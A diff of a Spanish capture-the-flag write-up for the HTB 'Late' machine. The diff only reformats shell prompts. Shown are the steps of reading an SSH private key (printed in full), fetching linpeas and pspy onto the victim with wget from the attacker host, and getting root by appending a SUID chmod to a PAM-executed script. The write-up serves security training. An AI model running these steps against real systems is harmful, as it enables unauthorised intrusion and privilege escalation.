@@ -66,7 +66,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Hay dos puertos abiertos, el 22 (SSH) y el 80 (HTTP). De momento no contamos con credenciales para iniciar sesión por SSH así que proseguimos a enumerar el sitio web, inicialmente usando la herramienta `whatweb`:
 ```shell
-❯ whatweb http://10.10.11.156
+rabb1t@hold:~$ whatweb http://10.10.11.156
 http://10.10.11.156 [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[\#,support@late.htb], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.156], JQuery[1.10.2], Meta-Author[Sergey Pozhilov (GetTemplate.com)], Script, Title[Late - Best online image tools], nginx[1.14.0]
 ```
 
@@ -103,11 +103,11 @@ La respuesta del servidor es nuevamente el archivo `results.txt`. En este caso v
 
 ...para subirlo y obtener la clave privada. Ahora movemos el archivo con la clave privada a nuestro directorio de trabajo y le quitamos las etiquetas `<p></p>` , además le damos permisos `600`:
 ```shell
-❯ mv ~/Downloads/results.txt id_rsa; 
-❯ sed -i 's/<p>//' id_rsa
-❯ sed -i 's/<\/p>//' id_rsa
-❯ chmod 600 id_rsa
-❯ cat id_rsa
+rabb1t@hold:~$ mv ~/Downloads/results.txt id_rsa; 
+rabb1t@hold:~$ sed -i 's/<p>//' id_rsa
+rabb1t@hold:~$ sed -i 's/<\/p>//' id_rsa
+rabb1t@hold:~$ chmod 600 id_rsa
+rabb1t@hold:~$ cat id_rsa
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
 HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
@@ -135,7 +135,7 @@ Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
 K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
 kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
 -----END RSA PRIVATE KEY-----
-❯ ssh -i id_rsa scv_acc@10.10.11.156
+rabb1t@hold:~$ ssh -i id_rsa scv_acc@10.10.11.156
 ```
 
 ## Escalando privilegios
@@ -143,16 +143,16 @@ kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
 Descargamos [linpeas](https://github.com/topics/linpeas) y [pspy](https://github.com/DominicBreuker/pspy)
 Movemos los archivos a nuestros directorios de trabajo y creamos un servidor por http:
 ```shell
-❯ mv ~/Downloads/pspy pspy
-❯ mv ~/Dowloads/linpeas.sh
-❯ python3 -m http.server 80
+rabb1t@hold:~$ mv ~/Downloads/pspy pspy
+rabb1t@hold:~$ mv ~/Dowloads/linpeas.sh
+rabb1t@hold:~$ python3 -m http.server 80
 ```
 
 Y en la máquina víctima:
 ```shell
-❯ svc_acc@late:~$ wget http://10.10.16.28/pspy
-❯ svc_acc@late:~$ wget http://10.10.16.28/linpeas.sh
-❯ svc_acc@late:~$ chmod 700 pspy; chmod 700 linpeas.sh
+svc_acc@late:~$ wget http://10.10.16.28/pspy
+svc_acc@late:~$ wget http://10.10.16.28/linpeas.sh
+svc_acc@late:~$ chmod 700 pspy; chmod 700 linpeas.sh
 ```
 
 ### Analizando posible vector
@@ -199,7 +199,7 @@ Analizando el script, entendemos que envía un correo con ciertas especifícacio
 
 Ahora ¿Cómo sabemos que el script se está ejecutando? Bueno, podemos revisar algunos archivos de configuración (`.bashrc`, `.profile`, `/etc`) o buscar el texto `/usr/local/sbin/ssh-alert.sh` de forma recursiva con grep para saber desde dónde se está ejecutando, de la siguiente forma:
 ```shell
-❯ svc_acc@late:~$ grep -r '/usr/local/sib/ssh-alert.sh' / 2>/dev/null
+svc_acc@late:~$ grep -r '/usr/local/sib/ssh-alert.sh' / 2>/dev/null
 session required pam_exec.so /usr/local/sbin/ssh-alert.sh
 ```
 
@@ -207,13 +207,13 @@ Podemos ver que está en el archivo `/etc/pam.d/sshd`; por lo que, ya podemos da
 
 Ahora veamos los permisos de `ssh-alert.sh`:
 ```shell
-❯ svc_acc@late:/usr/local/sbin$ ls -la
+svc_acc@late:/usr/local/sbin$ ls -la
 total 12
 drwxr-xr-x  2 svc_acc svc_acc 4096 Jul 29 16:20 .
 drwxr-xr-x 10 root    root    4096 Aug  6  2020 ..
 -rwxr-xr-x  1 svc_acc svc_acc  433 Jul 29 16:20 ssh-alert.sh
 
-❯ svc_acc@late:/usr/local/sbin$ lsattr ssh-alert.sh 
+svc_acc@late:/usr/local/sbin$ lsattr ssh-alert.sh 
 -----a--------e--- ssh-alert.sh
 ```
 
@@ -225,12 +225,12 @@ svc_acc@late:/usr/local/sbin$ echo 'chmod u+s /bin/bash' >> /usr/local/sbin/ssh-
 Escribimos en el archivo (`ssh-alert`) que queremos darle permisos `SUID` al binario `/bin/bash`
 Salimos de la sesión y volvemos a iniciar con el mismo usuario:
 ```shell
-❯ svc_acc@late:/usr/local/sbin$ exit
+svc_acc@late:/usr/local/sbin$ exit
 Connection to 10.10.11.156 closed
 
-❯ ssh svc_acc@10.10.11.156 -i id_rsa
+rabb1t@hold:~$ ssh svc_acc@10.10.11.156 -i id_rsa
 
-❯ bash-4.4$ /bin/bash -p
+svc_acc@late:~$ bash-4.4$ /bin/bash -p
 ❯ bash-4.4\# whoami
 root
 ```
